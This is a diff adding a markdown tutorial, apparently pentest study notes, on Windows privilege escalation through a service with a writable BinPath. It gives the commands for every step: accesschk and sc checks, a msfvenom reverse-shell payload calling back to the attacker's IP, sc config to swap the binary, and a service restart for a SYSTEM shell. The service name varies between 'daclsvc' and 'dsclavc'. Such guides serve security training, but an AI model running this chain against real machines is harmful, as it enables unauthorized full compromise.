@@ -1,0 +1,78 @@
+# Escalation **via BinPath**
+
+Some Windows services allow users to change their executable path (BinPath). If you can modify this path, you can replace the service with a malicious executable (like a reverse shell). When the service restarts, it runs your payload with high privileges (often SYSTEM).
+
+### **1. Find Vulnerable Services**
+
+Run **WinPEAS** or **PowerUp.ps1** to find services with weak permissions:
+
+![image.png](attachment:6b549a01-c392-4b79-8677-9d442b0cea98:image.png)
+
+OR
+
+![image.png](attachment:cfbfa851-4550-4cf9-ad72-355bd6ae5558:image.png)
+
+Look for services with:
+
+✔ **SERVICE_CHANGE_CONFIG** permission
+
+✔ **Writable BinPath**
+
+*(Example: Suppose `daclsvc`  is vulnerable here.)*
+
+### **2. Check Permissions**
+
+Use **AccessChk** to confirm you can modify the service:
+
+```bash
+.\accesschk.exe /accepteula -uwcqv user dsclavc
+```
+
+![image.png](attachment:7fd4980a-3e40-44da-af78-d324486d25e7:image.png)
+
+✅ **You need these permissions:**
+
+- **`SERVICE_CHANGE_CONFIG`** (to modify the service)
+- **`SERVICE_START/STOP`** (to restart it)
+
+*(If missing, try another service!)*
+
+### **3. Check Service Details (Optional)**
+
+```
+sc qc dsclavc        # Check executable path & privileges
+sc query dsclavc     # Check if service is running
+```
+
+🔹 **If it runs as `LocalSystem` → Perfect!**
+
+Here you can see the `SERVICE_START_NAME` is LocalSystem it means the service runs with **very high privileges** and the `BINARY_PATH_NAME`  which you are going to modify
+
+![image.png](attachment:29b89f99-fa34-4f79-b063-cd66955adbbb:image.png)
+
+### **4. Generate a Reverse Shell**
+
+On your Kali machine:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
+```
+
+Upload **`evil.exe`** to the victim machine.
+
+### **5. Change the Service BinPath**
+
+```
+sc config dsclavc binpath= "C:\Temp\evil.exe"
+```
+
+*(Replace **`C:\Temp\evil.exe`** with your payload path.)*
+
+### **6. Restart the Service**
+
+```
+net stop dsclavc
+net start dsclavc
+```
+
+🎉 **If successful, you get a reverse shell with SYSTEM privileges!**
